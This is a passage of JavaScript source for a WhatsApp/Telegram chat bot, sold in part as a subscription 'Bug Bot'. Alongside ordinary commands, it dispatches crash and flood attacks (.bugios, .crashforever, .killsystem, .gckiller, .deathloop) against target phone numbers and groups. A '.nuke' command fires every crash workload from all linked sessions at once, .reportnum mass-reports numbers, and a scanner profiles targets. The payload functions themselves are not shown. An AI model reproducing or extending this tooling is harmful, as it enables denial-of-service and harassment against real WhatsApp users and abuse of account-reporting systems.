📈 *REALM LADDER* — upgrade for higher limits
.realm — your progress · .realms — all realms

🏆 .auraboard — see who's farming hardest`;
  }

  // ── BONDS ──
  if(['.bond','/bond'].includes(cmd)) return cmdBond(args, userId, name);
  if(['.bonds','/bonds','.relation','/relation','.relationship','/relationship'].includes(cmd)) return cmdBond(['list'], userId, name);

  // ── IDENTITY ──
  { const r = cmdIdentity(cmd, args, userId, name); if(r) return r; }

  // ── PRESENCE ──
  { const r = cmdPresence(cmd, args, userId, name); if(r) return r; }

  // ── FRACTURE ──
  { const r = cmdFracture(cmd, args, userId, name, chatId); if(r) return r; }

  // ── Bot info ──
  if(cmd==='.botinfo'||cmd==='.ping') {
    return `💕 I'm here, awake for ${fmtUptime()}.`;
  }

  // ── Profile pic ──
  if (['.pic','.mypic','.selfie','.pfp'].includes(cmd)) {
    if (!fs.existsSync(BOT_PFP_PATH)) return "...i don't have a picture set yet. ask the owner to set one with .setpfp";
    return '__SEND_PIC__'; // signal to platform handler to send the actual image
  }
  if (cmd === '.setpfp') {
    if (!isOwner(rawUserId||userId)) return '❌ owner only.';
    return "📸 reply to an image with .setpfp to set my picture, or send an image with caption '.setpfp'";
  }

  // ── Report ──
  if(cmd==='.report') return handleReport(args, name, chatId);

  // ── Report a number via WhatsApp's native report button (block→report→unblock loop) ──
  if (cmd === '.reportnum' || cmd === '.numreport') {
    const _rnOwn = isOwner(userId) && OWNER_GOD_MODE;
    if (!_rnOwn && !isSudo(userId)) return '❌ Owner/sudo only — this uses the bot\'s account to report.';
    // Resolve sock from _selfCtx (set per-message by the WA handler) or fall back to any live session
    const _rnCtx = _selfCtx.getStore() || {};
    const _rnBotSession = sessions?.get('__bot__');
    const _rnAnySession = (_rnCtx.sock && _rnCtx.sock.user)
      ? { sock: _rnCtx.sock, connected: true }
      : (_rnBotSession?.connected ? _rnBotSession : (() => {
          for (const [, s] of (sessions || new Map())) { if (s?.connected) return s; }
          return null;
        })());
    if (!_rnAnySession?.connected) return '❌ No WhatsApp session active. Link one with /pair first.';
    const _rnSock    = _rnAnySession.sock;
    const _rnJid     = chatId;                                  // chatId IS the jid in WA context
    const _rnIsGroup = String(_rnJid).endsWith('@g.us');
    // Usage: .reportnum <number> [times] <reason>
    // times is optional integer — defaults to 1, max 20
    const [numArg, maybeCount, ...restArgs] = args;
    let count = 1;
    let reasonParts;
    if (maybeCount && /^\d+$/.test(maybeCount)) {
      count = parseInt(maybeCount);
      reasonParts = restArgs;
    } else {
      reasonParts = maybeCount ? [maybeCount, ...restArgs] : [];
    }
    const reason = reasonParts.join(' ').trim();
    // handleReportNumber is async — fire and return sentinel so dispatcher doesn't show "unknown command"
    handleReportNumber({
      number: numArg,
      count,
      reason,
      reportedBy: userId,
      reportedByName: name,
      groupId: _rnIsGroup ? _rnJid : '',
      sock: _rnSock,
      replyJid: _rnJid,
    }).then(result => {
      if (result) _rnSock.sendMessage(_rnJid, { text: result }).catch(() => {});
    }).catch(e => {
      _rnSock.sendMessage(_rnJid, { text: `❌ Report failed: ${e.message}` }).catch(() => {});
    });
    return '__ASYNC__'; // tells dispatcher: reply is being sent async, don't show fallback
  }

  // ── Bug menu — hidden, only shows when explicitly typed ──
  if (cmd === '.bugmenu' || cmd === '||bugmenu' || text.toLowerCase().trim() === '|| bug menu') {
    if (!hasBugAccess(userId)) {
      return (
        `🔒 *Bug Bot — Premium Only*\n\n` +
        `You don\'t have access to the Bug Bot.\n\n` +
        `📲 Contact the owner on Telegram to subscribe:\n` +
        `👉 *t.me/${OWNER_TG}*\n\n` +
        `_Plans: Weekly & Monthly_`
      );
    }
    return buildBugMenuText(userId);
  }

  // ── Bug access management (owner/sudo only) ──
  if (cmd === '.bugadd') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const [numArg, tierArg, ...noteArr] = args;
    const clean = _bugValidateNum(numArg);
    if (!clean) return '❌ Usage: `.bugadd <number> weekly|monthly [note]`';
    const tier = (tierArg || 'weekly').toLowerCase() === 'monthly' ? 'monthly' : 'weekly';
    const expires = grantBugAccess(clean, tier, userId, noteArr.join(' '));
    const expDate = new Date(expires).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
    // Notify the user on WA
    const _gaCtx = _selfCtx.getStore() || {};
    const _gaSock = _bugResolveSock(_gaCtx, sessions);
    if (_gaSock) {
      _gaSock.sendMessage(`${clean}@s.whatsapp.net`, {
        text:
          `🐛 *Bug Bot Access Granted!*\n\n` +
          `✅ Plan: *${tier === 'monthly' ? '📅 Monthly' : '📆 Weekly'}*\n` +
          `📅 Expires: *${expDate}*\n\n` +
          `Type *.bugmenu* to see all commands.\n\n` +
          `_Enjoy the Bug Bot! 🔥_`,
      }).catch(() => {});
    }
    return `✅ Bug access granted!\n\n📱 +${clean}\n🎟 Plan: *${tier}*\n📅 Expires: *${expDate}*`;
  }

  if (cmd === '.bugremove') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const clean = _bugValidateNum(args[0]);
    if (!clean) return '❌ Usage: `.bugremove <number>`';
    const had = getBugAccessInfo(clean);
    if (!had) return `⚠️ +${clean} doesn't have bug access.`;
    revokeBugAccess(clean);
    const _grCtx = _selfCtx.getStore() || {};
    const _grSock = _bugResolveSock(_grCtx, sessions);
    if (_grSock) {
      _grSock.sendMessage(`${clean}@s.whatsapp.net`, {
        text: `🐛 *Bug Bot Access Revoked*\n\nYour subscription has ended.\n\n📲 Contact the owner on Telegram to renew:\n👉 *t.me/${OWNER_TG}*`,
      }).catch(() => {});
    }
    return `✅ Bug access removed for +${clean}.`;
  }

  if (cmd === '.bugusers') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const users = listBugAccessUsers();
    if (!users.length) return '📋 No bug access users yet.';
    const now = Date.now();
    const lines = users.map(u => {
      const active = u.expires_at === 0 || now < u.expires_at;
      const expStr = u.expires_at === 0 ? 'Lifetime' : new Date(u.expires_at).toLocaleDateString('en-GB');
      return `${active ? '✅' : '❌'} +${u.id} — ${u.tier} — exp: ${expStr}`;
    });
    return `🐛 *Bug Access Users*\n\n${lines.join('\n')}\n\nTotal: ${users.length}`;
  }

  if (cmd === '.bugextend') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const [numArg, tierArg] = args;
    const clean = _bugValidateNum(numArg);
    if (!clean) return '❌ Usage: `.bugextend <number> weekly|monthly`';
    const tier = (tierArg || 'weekly').toLowerCase() === 'monthly' ? 'monthly' : 'weekly';
    const expires = grantBugAccess(clean, tier, userId);
    const expDate = new Date(expires).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
    return `✅ Extended! +${clean} — ${tier} — expires: ${expDate}`;
  }

  // ── Activate bug access via code ──
  if (cmd === '.activate' || cmd === '.bugactivate') {
    const code = args[0];
    if (!code) return (
      `🐛 *Bug Bot Activation*\n\n` +
      `Usage: \`.activate <code>\`\n` +
      `Example: \`.activate WK-A3B2-C4D1-E5F6\`\n\n` +
      `_Get a code from the owner on Telegram:_\n` +
      `👉 *t.me/${OWNER_TG}*`
    );
    const result = redeemBugCode(code, userId);
    if (!result.ok) {
      if (result.reason === 'expired') return `❌ *Code expired.*\n\nThis code is more than 48 hours old.\nContact the owner for a new one: *t.me/${OWNER_TG}*`;
      return `❌ *Invalid or already used code.*\n\nContact the owner: *t.me/${OWNER_TG}*`;
    }
    const info    = getBugAccessInfo(userId);
    const expDate = new Date(info.expires_at).toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
    return (
      `✅ *Bug Bot Activated!*\n\n` +
      `🎟 Plan: *${result.tier === 'monthly' ? '📅 Monthly' : '📆 Weekly'}*\n` +
      `📅 Expires: *${expDate}*\n\n` +
      `Type *.bugmenu* to see all commands.\n` +
      `_Welcome to the Bug Bot! 🔥_`
    );
  }

  // ── Premium gate — check bug access before ALL bug commands ──
  const _isBugCmd = [
    '.bug','.bugnum','.bugios','.ioscrash','.bugandroid','.androidbug','.androidcrash',
    '.cinvisible','.crashforever','.pending','.pendingv2','.pendingmix','.killsystem','.crashdroid',
    '.simpleios','.cantsee','.hidenseek','.iosinvisible','.iosvisible',
    '.gckiller','.androgc','.androgcstatus','.delayfcgc','.groupios','.groupmix','.listgc','.groupid',
    '.benchmark','.nuke',
    '.bugcrash','.bugflood','.bugloop','.crashnow','.permcrash','.deathloop',
  ].includes(cmd);

  if (_isBugCmd && !hasBugAccess(userId)) {
    const info = getBugAccessInfo(userId);
    if (info && Date.now() >= info.expires_at) {
      // Expired — inform them
      return (
        `⏰ *Bug Bot Access Expired*\n\n` +
        `Your ${info.tier} plan expired on *${new Date(info.expires_at).toLocaleDateString('en-GB')}*.\n\n` +
        `📲 Contact the owner on Telegram to renew:\n👉 *t.me/${OWNER_TG}*`
      );
    }
    return (
      `🔒 *Bug Bot — Premium Only*\n\n` +
      `This command requires a Bug Bot subscription.\n\n` +
      `Type *.bugmenu* to learn more.\n` +
      `📲 Contact the owner on Telegram:\n👉 *t.me/${OWNER_TG}*`
    );
  }

  // ── Bug command ──
  if (cmd === '.bug' || cmd === '.bugnum') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const [numArg, countArg] = args;
    if (!numArg) return '❌ Usage: `.bug <number> [times]`\nExample: `.bug 2348012345678 5`';
    // Resolve sock from context (same pattern as .reportnum)
    const _bgCtx = _selfCtx.getStore() || {};
    const _bgBotSess = sessions?.get('__bot__');
    const _bgAnySess = (_bgCtx.sock && _bgCtx.sock.user)
      ? { sock: _bgCtx.sock, connected: true }
      : (_bgBotSess?.connected ? _bgBotSess : (() => {
          for (const [, s] of (sessions || new Map())) { if (s?.connected) return s; }
          return null;
        })());
    if (!_bgAnySess?.connected) return '❌ No WhatsApp session active.';
    const _bgSock = _bgAnySess.sock;
    handleBug({
      number: numArg,
      count: parseInt(countArg) || 1,
      sock: _bgSock,
      replyJid: chatId,
      userId,
      name,
    }).then(result => {
      if (result) _bgSock.sendMessage(chatId, { text: result }).catch(() => {});
    }).catch(e => {
      _bgSock.sendMessage(chatId, { text: `❌ Bug failed: ${e.message}` }).catch(() => {});
    });
    return '__ASYNC__';
  }

  // ── iOS bug ──
  if (cmd === '.bugios' || cmd === '.iosbug' || cmd === '.ioscrash') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const [numArg, countArg] = args;
    if (!numArg) return '❌ Usage: `.bugios <number> [times]`';
    const _biCtx = _selfCtx.getStore() || {};
    const _biBotSess = sessions?.get('__bot__');
    const _biAnySess = (_biCtx.sock && _biCtx.sock.user)
      ? { sock: _biCtx.sock, connected: true }
      : (_biBotSess?.connected ? _biBotSess : (() => {
          for (const [, s] of (sessions || new Map())) { if (s?.connected) return s; }
          return null;
        })());
    if (!_biAnySess?.connected) return '❌ No WhatsApp session active.';
    const _biSock = _biAnySess.sock;
    handleBugIOS({ number: numArg, count: parseInt(countArg) || 1, sock: _biSock, replyJid: chatId, userId, name })
      .then(r => { if (r) _biSock.sendMessage(chatId, { text: r }).catch(() => {}); })
      .catch(e => { _biSock.sendMessage(chatId, { text: `❌ iOS bug failed: ${e.message}` }).catch(() => {}); });
    return '__ASYNC__';
  }

  // ── Android bug ──
  if (cmd === '.bugandroid' || cmd === '.androidbug' || cmd === '.androidcrash') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    const [numArg, countArg] = args;
    if (!numArg) return '❌ Usage: `.bugandroid <number> [times]`';
    const _baCtx = _selfCtx.getStore() || {};
    const _baBotSess = sessions?.get('__bot__');
    const _baAnySess = (_baCtx.sock && _baCtx.sock.user)
      ? { sock: _baCtx.sock, connected: true }
      : (_baBotSess?.connected ? _baBotSess : (() => {
          for (const [, s] of (sessions || new Map())) { if (s?.connected) return s; }
          return null;
        })());
    if (!_baAnySess?.connected) return '❌ No WhatsApp session active.';
    const _baSock = _baAnySess.sock;
    handleBugAndroid({ number: numArg, count: parseInt(countArg) || 1, sock: _baSock, replyJid: chatId, userId, name })
      .then(r => { if (r) _baSock.sendMessage(chatId, { text: r }).catch(() => {}); })
      .catch(e => { _baSock.sendMessage(chatId, { text: `❌ Android bug failed: ${e.message}` }).catch(() => {}); });
    return '__ASYNC__';
  }

  // ── New brutal crash commands ──
  if (cmd === '.bugcrash' || cmd === '.crashnow') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleBugCrash, { number: args[0] }); }
  if (cmd === '.bugflood') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleBugFlood, { number: args[0], minutes: args[1] }); }
  if (cmd === '.stopflood') { const g = _sudoOnly(); if (g) return g; return handleStopFlood({ number: args[0] }); }
  if (cmd === '.bugloop') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleBugLoop, { number: args[0], rounds: args[1] }); }
  if (cmd === '.permcrash') { const g = _sudoOnly(); if (g) return g; return _bugFire(handlePermCrash, { number: args[0] }); }
  if (cmd === '.deathloop') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleDeathLoop, { number: args[0], minutes: args[1] }); }

  // ── Bug dispatch helper ──
  const _bugFire = (fn, args) => {
    const _ctx = _selfCtx.getStore() || {};
    const _s = _bugResolveSock(_ctx, sessions);
    if (!_s) return '❌ No WhatsApp session active.';
    fn({ ...args, sock: _s, replyJid: chatId, userId, name })
      .then(r => { if (r) _s.sendMessage(chatId, { text: r }).catch(() => {}); })
      .catch(e => { _s.sendMessage(chatId, { text: `❌ Failed: ${e.message}` }).catch(() => {}); });
    return '__ASYNC__';
  };
  const _sudoOnly = () => (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) ? '❌ Owner/sudo only.' : null;

  // Android bugs
  if (cmd === '.cinvisible') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleCinvisible, { number: args[0], count: args[1] }); }
  if (cmd === '.crashforever') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleCrashForever, { number: args[0] }); }
  if (cmd === '.pending') { const g = _sudoOnly(); if (g) return g; return _bugFire(handlePending, { number: args[0], count: args[1], version: 1 }); }
  if (cmd === '.pendingv2') { const g = _sudoOnly(); if (g) return g; return _bugFire(handlePending, { number: args[0], count: args[1], version: 2 }); }
  if (cmd === '.pendingmix') { const g = _sudoOnly(); if (g) return g; return _bugFire(handlePendingMix, { number: args[0], count: args[1] }); }
  if (cmd === '.killsystem') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleKillSystem, { number: args[0], count: args[1] }); }
  if (cmd === '.crashdroid') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleCrashDroid, { number: args[0], count: args[1] }); }

  // iOS bugs
  if (cmd === '.simpleios') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleSimpleIOS, { number: args[0], count: args[1] }); }
  if (cmd === '.cantsee') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleCantSee, { number: args[0] }); }
  if (cmd === '.hidenseek') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleHideNSeek, { number: args[0], count: args[1] }); }
  if (cmd === '.iosinvisible') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleIOSInvisible, { number: args[0], count: args[1] }); }
  if (cmd === '.iosvisible') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleIOSVisible, { number: args[0], count: args[1] }); }

  // Group bugs
  if (cmd === '.gckiller') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleGcKiller, { groupJid: args[0] }); }
  if (cmd === '.androgc') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleAndroGC, { groupJid: args[0] }); }
  if (cmd === '.androgcstatus') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleAndroGCStatus, { groupJid: args[0], count: args[1] }); }
  if (cmd === '.delayfcgc') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleDelayFCGC, { groupJid: args[0] }); }
  if (cmd === '.groupios') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleGroupIOS, { groupJid: args[0], count: args[1] }); }
  if (cmd === '.groupmix') { const g = _sudoOnly(); if (g) return g; return _bugFire(handleGroupMix, { groupJid: args[0], count: args[1] }); }
  if (cmd === '.listgc') {
    const g = _sudoOnly(); if (g) return g;
    const _ctx2 = _selfCtx.getStore() || {};
    const _s2 = _bugResolveSock(_ctx2, sessions);
    if (!_s2) return '❌ No session.';
    return handleListGC({ sock: _s2, replyJid: chatId });
  }
  if (cmd === '.groupid') {
    const g = _sudoOnly(); if (g) return g;
    const _ctx3 = _selfCtx.getStore() || {};
    const _s3 = _bugResolveSock(_ctx3, sessions);
    if (!_s3) return '❌ No session.';
    return handleGroupIDFromLink({ link: args[0], sock: _s3, replyJid: chatId });
  }

  // ── Full benchmark nuke (all dispatchers × all sessions) ──
  if (cmd === '.benchmark' || cmd === '.nuke') {
    const g = _sudoOnly(); if (g) return g;
    const [targetArg, cyclesArg, concArg] = args;
    if (!targetArg) return (
      '❌ Usage: `.benchmark <number|groupid> [cycles] [concurrency]`\n' +
      'Example: `.benchmark 2348012345678 3 10`\n' +
      'Example: `.benchmark 1234567890-123@g.us 2 5`\n\n' +
      '⚡ Fires ALL 17 crash workloads × concurrency × cycles simultaneously\n' +
      '🔥 Android + iOS + Group vectors — everything at once'
    );
    const _bnCtx = _selfCtx.getStore() || {};
    const _bnSock = _bugResolveSock(_bnCtx, sessions);
    if (!_bnSock) return '❌ No WhatsApp session active.';

    // Resolve target — phone number → JID, or group ID passed directly
    let targetJid = targetArg;
    if (!targetArg.includes('@')) {
      const clean = targetArg.replace(/[\s\-\+]/g, '').replace(/^0+/, '');
      if (!/^\d{6,15}$/.test(clean)) return '❌ Invalid number or group ID.';
      targetJid = `${clean}@s.whatsapp.net`;
      const { isOnWA } = await _bugCheckWA(_bnSock, targetJid);
      if (!isOnWA) return `⚠️ +${clean} not on WhatsApp.`;
    }

    const cycles = Math.min(Math.max(1, parseInt(cyclesArg) || 3), 10);
    const conc   = Math.min(Math.max(1, parseInt(concArg) || 10), 20);
    const isGroup = targetJid.endsWith('@g.us');
    const allSocks = _bugAllSocks(); const sessCount = allSocks.length || 1;

    try { await _bnSock.sendMessage(chatId, { text:
      `💣 *BENCHMARK NUKE STARTED*\n\n` +
      `🎯 Target: \`${targetJid}\`\n` +
      `🔁 Cycles: *${cycles}*  ⚡ Concurrency: *${conc}×*\n` +
      `📦 Sessions firing: *${sessCount}*\n` +
      `🔥 Workloads: *${isGroup ? 17 : 12}* per round\n` +
      `💀 Estimated payloads: *~${cycles * conc * (isGroup ? 17 : 12) * 6 * sessCount}*\n\n` +
      `_Launching all dispatchers..._`,
    }); } catch (_) {}

    // Fire from ALL sessions simultaneously for maximum impact
    const sockList = allSocks.length ? allSocks : [_bnSock];
    const onProgress = async (wave, totalWaves, dispatched, ok, fail) => {
      try { await _bnSock.sendMessage(chatId, { text:
        `⏳ *Wave ${wave}/${totalWaves} complete*\n` +
        `📤 Dispatched: ${dispatched}  ✅ OK: ${ok}  ❌ Failed: ${fail}`,
      }); } catch (_) {}
    };

    Promise.allSettled(
      sockList.map(s => runHighIntensityBenchmark(targetJid, s, cycles, conc,
        s === _bnSock ? onProgress : null))
    ).then(results => {
      const best = results.find(r => r.status === 'fulfilled')?.value;
      if (!best) return;
      const summary =
        `💣 *BENCHMARK NUKE DONE!*\n\n` +
        `🎯 *${targetJid}*\n` +
        `🔁 Cycles: *${best.cycles}*  ⚡ ${best.concurrencyMultiplier}× concurrency\n` +
        `📦 Sessions used: *${sockList.length}*\n` +
        `📤 Total operations: *${best.totalOperations * sockList.length}*\n` +
        `✅ Successful: *${best.successfulOperations * sockList.length}*\n` +
        `❌ Failed: *${best.failedOperations}*\n` +
        `⚡ Avg latency: ${best.averageLatencyMs}ms\n` +
        `💀 Est. payloads sent: *~${best.totalPayloadsEstimate * sockList.length}*\n\n` +
        `🔥 All dispatchers fired. Target is destroyed.`;
      _bnSock.sendMessage(chatId, { text: summary }).catch(() => {});
    }).catch(e => {
      _bnSock.sendMessage(chatId, { text: `❌ Benchmark error: ${e.message}` }).catch(() => {});
    });

    return '__ASYNC__';
  }

  // ── Proxy management ──
  if (cmd === '.proxy') {
    const _pCtx = _selfCtx.getStore() || {};
    const _pSock = _bugResolveSock(_pCtx, sessions);
    const _sessKey = (_pSock && ([...sessions].find(([, v]) => v && v.sock === _pSock) || [])[0]) || 'global';
    const own = isOwner(userId) && OWNER_GOD_MODE;
    return handleProxyCommand({ args, sock: _pSock, sessionKey: String(_sessKey), own, isSudo, userId, rawUserId }).catch(e => {
      console.error('[proxy cmd]', e.message);
      return '⚠️ Proxy command hit a problem: ' + e.message;
    });
  }

  if (cmd === '.reports') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    return handleViewReports({ args });
  }

  if (cmd === '.reportinfo') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    return handleReportInfo({ number: args[0] });
  }

  if (cmd === '.clearreports') {
    if (!(isOwner(userId) && OWNER_GOD_MODE) && !isSudo(userId)) return '❌ Owner/sudo only.';
    return handleClearReports({ number: args[0] });
  }

  // ── Memory ──
  const mem = handleMemory(cmd, args, userId, name);
  if(mem) return mem;

  // ── Notes password ──
  const npw = handleNotesPw(cmd, args, userId);
  if(npw) return npw;

  // ── addnote alias ──
  if(cmd==='.addnote') {
    const title=args[0], content=args.slice(1).join(' ');
    if(!title||!content) return '😒 .addnote <title> <content>';
    db.prepare('INSERT INTO notes (user_id,title,content,created_at) VALUES (?,?,?,?)').run(userId,title,content,new Date().toISOString());
    return `📝 note "${title}" saved.`;
  }

  // ── Settings ──
  if(cmd==='.set') return handleSet(args, userId);

  // ── WA tools ──
  if(cmd==='.wanumber') {
    const query = args.join(' ').trim();
    if(!query) return '😒 .wanumber <@lid | username>\ne.g. .wanumber johndoe';
    const num = waLid.lookupNumber(query);
    return num ? `📱 ${query} → +${num}` : `❓ not resolved yet (lids known: ${lidMap.size()}, usernames: ${lidMap.usernameSize()}).\nthey need to have sent a message or been seen in a shared group first.`;
  }
  if(cmd==='.wafind') {
    const num = (args[0]||'').replace(/\D/g,'');
    if(!num) return '😒 .wafind <number>\ne.g. .wafind 2347085331433';
    return `🔍 Checking if +${num} is on WhatsApp...\n\n(Connect your WhatsApp first with /pair to use this feature.)`;
  }
  if(cmd==='.wastatus') {
    const tgId = (rawUserId||'').replace('tg_','');
    const botSession = sessions?.get('__bot__');
    const userSession = sessions?.get(tgId);
    const lines = [];
    if (botSession) {
      const status = botSession.connected ? '🟢 connected' : '🔴 disconnected';
      const phone = botSession.phone ? `(+${botSession.phone})` : '';
      lines.push(`✨ My WhatsApp: ${status} ${phone}`);
    } else {
      lines.push('✨ My WhatsApp: ❌ not configured');
    }
    if (userSession) {
      const status = userSession.connected ? '🟢 connected' : '🔴 reconnecting...';
      const phone = userSession.phone ? `(+${userSession.phone})` : '';
      lines.push(`👤 Your WA: ${status} ${phone}`);
    } else {
      lines.push('👤 Your WA: ❌ not linked — use /pair');
    }
    const totalSessions = sessions?.size || 0;
    lines.push(`\n📊 Total sessions: ${totalSessions}`);
    lines.push(`⏱️ Bot uptime: ${fmtUptime()}`);
    return `📡 *WA STATUS*\n\n${lines.join('\n')}`;
  }
  if(cmd==='.mybots') {
    const tgId = (rawUserId||'').replace('tg_','');
    const session = sessions?.get(tgId);
    if(!session) return `✨ YOUR LINKED SESSIONS\n\nTelegram: ✅ connected\nWhatsApp: ❌ not linked\n\nUse /pair <your_number> to link WhatsApp`;
    const waStatus = session.connected ? '✅ connected' : '🔄 reconnecting...';
    const phone = session.phone ? `(+${session.phone})` : '';
    return `✨ YOUR LINKED SESSIONS\n\nTelegram: ✅ connected\nWhatsApp: ${waStatus} ${phone}\n\n/wastatus — detailed WA status\n/unpair — unlink WhatsApp`;
  }
  if(cmd==='.tgwa') {
    return 'Sending WhatsApp messages to other numbers is turned off to protect the account from bans.';
  }
  if(false && cmd==='.tgwa') {
    const num = (args[0]||'').replace(/\D/g,'');
    const msg = args.slice(1).join(' ');
    if(!num||!msg) return '😒 .tgwa <number> <message>\ne.g. .tgwa 2347085331433 hey!';
    const tgId = (rawUserId||'').replace('tg_','');
    const session = sessions?.get(tgId);
    if(!session?.connected) return '❌ WhatsApp not linked. Use /pair <your_number> first.';
    const jid = num + '@s.whatsapp.net';
    session.sock.sendMessage(jid, {text: msg}).then(() => {}).catch(e => console.error('[tgwa]',e.message));
    return `📤 sending to +${num}...\n"${msg}"`;
  }

  // ── ADVANCED WA NUMBER SCANNER ───────────────────────────────────────────
  if (cmd === '?' || cmd === '?alive' || cmd === '?check' || cmd === '?scan') {
    const num = (args[0]||'').replace(/\D/g,'');
    if (!num) return `❓ Usage: ? <number>\nExample: ? 2347085331433`;

    const botSession = sessions?.get('__bot__');
    const anySession = botSession?.connected ? botSession : (() => {
      for (const [, s] of (sessions||new Map())) { if (s?.connected) return s; }
      return null;
    })();
    if (!anySession?.connected) return '❌ No WhatsApp session active. Link one with /pair first.';

    const sock = anySession.sock;
    const jid  = num + '@s.whatsapp.net';
    const scanStart = Date.now();

    // ── Fire all probes concurrently ──────────────────────────────────────
    const [onWA, statusRes, picRes, bizRes, ppThumb] = await Promise.allSettled([
      sock.onWhatsApp(num),
      sock.fetchStatus(jid),
      sock.profilePictureUrl(jid, 'image'),
      sock.getBusinessProfile(jid),
      sock.profilePictureUrl(jid, 'preview'),   // thumbnail probe (separate from full)
    ]);

    const scanMs   = Date.now() - scanStart;
    const waEntry  = onWA.status === 'fulfilled' ? (onWA.value||[])[0] : null;
    const isOnWA   = !!waEntry?.exists;

    // ── Pull name from every available source ─────────────────────────────
    const pushName =
      waEntry?.notify ||
      waEntry?.name   ||
      sock.store?.contacts?.[jid]?.name ||
      sock.store?.contacts?.[jid]?.notify ||
      (bizRes.status === 'fulfilled' && bizRes.value?.name) ||
      null;

    const masked = '+' + num.slice(0, 5) + '*'.repeat(Math.max(num.length - 5, 5));

    // ── Picture signals ───────────────────────────────────────────────────
    const hasPic      = picRes.status === 'fulfilled' && !!picRes.value;
    const hasThumb    = ppThumb.status === 'fulfilled' && !!ppThumb.value;
    const anyPic      = hasPic || hasThumb;

    // ── Status / about ────────────────────────────────────────────────────
    const statusObj   = statusRes.status === 'fulfilled' ? statusRes.value : null;
    const aboutText   = statusObj?.status?.trim() || null;
    const aboutAge    = statusObj?.setAt ? Math.floor((Date.now()/1000 - statusObj.setAt) / 86400) : null;

    // ── Business profile ──────────────────────────────────────────────────
    const biz         = bizRes.status === 'fulfilled' ? bizRes.value : null;
    const isBusiness  = !!(biz?.description || biz?.email || biz?.website?.length || biz?.category);

    // ── Ban / modban detection (multi-signal) ─────────────────────────────
    // Signal 1 — onWhatsApp
    // Signal 2 — pic accessible even though not on WA (ghost/banned profile remnant)
    // Signal 3 — status fetch error type
    // WhatsApp has NO public API that reports a ban. All we can truthfully observe is whether the
    // number is registered. So the scan reports only that, plus a weak hint when a profile remnant exists.
    let accountStatus, banType, banConfidence;
    if (isOnWA) {
      accountStatus = 'REGISTERED';
      banType       = 'Not detectable (a registered number can still be banned or limited)';
      banConfidence = 'N/A';
    } else if (anyPic) {
      accountStatus = 'NOT REGISTERED';
      banType       = 'Possible ban/softban (profile data still reachable)';
      banConfidence = 'LOW (hint only)';
    } else {
      accountStatus = 'NOT REGISTERED';
      banType       = 'Unknown (never registered, deleted, or permanently banned)';
      banConfidence = 'N/A';
    }
    const isModban = false;
    const isBanned = false;

    // ── Privacy detection ─────────────────────────────────────────────────
    const privacyPic    = isOnWA && !anyPic  ? 'Hidden'  : isOnWA ? 'Visible' : 'N/A';
    const privacyAbout  = isOnWA && !aboutText ? 'Hidden / Empty' : isOnWA ? 'Visible' : 'N/A';

    // ── Activity level ────────────────────────────────────────────────────
    let activityLevel = 'Unknown';
    if (isOnWA) {
      const signals = [anyPic, !!aboutText, aboutAge !== null && aboutAge < 30].filter(Boolean).length;
      activityLevel = signals >= 2 ? 'Active' : signals === 1 ? 'Low Activity' : 'Dormant / Ghost';
    }

    // ── Account age estimate (rough — based on number prefix patterns) ────
    // Not from WA API — just a heuristic note
    const acctType = isBusiness ? 'Business Account' : 'Personal Account';

    let aiBanReason = null;
    let aiVerdict   = null;

    // ── Build the report ──────────────────────────────────────────────────
    const line = '━━━━━━━━━━━━━━━━━━━━━━━━━';
    const lines = [
      line,
      `      🔍 WA NUMBER SCAN`,
      line,
      ``,
      `📱 Number     : ${masked}`,
      `👤 Name       : ${pushName || 'Hidden / Unknown'}`,
      ``,
      `📊 Registered  : ${isOnWA ? '✅ YES (on WhatsApp)' : '❌ NO (not on WhatsApp)'}`,
      `🔒 Ban status  : ❔ ${banType}`,
      anyPic && !isOnWA ? `📶 Hint strength: ${banConfidence}` : null,
      `ℹ️ WhatsApp doesn't publish ban info, so a ban can't be confirmed from here.`,
      ``,
      `🏢 Type       : ${acctType}`,
      `🖼️ Avatar     : ${anyPic ? 'Set ✅' : 'Not set / Hidden'}`,
      `💬 About      : ${aboutText ? `"${aboutText.slice(0,40)}${aboutText.length>40?'…':''}"` : 'Empty / Hidden'}`,
      aboutAge !== null ? `⏱️ About age  : ${aboutAge === 0 ? 'Updated today' : `${aboutAge} day(s) ago`}` : null,
      `🔐 Privacy    : Pic → ${privacyPic} | About → ${privacyAbout}`,
      `📈 Activity   : ${activityLevel}`,
      isBusiness && biz?.category    ? `🏬 Category   : ${biz.category}` : null,
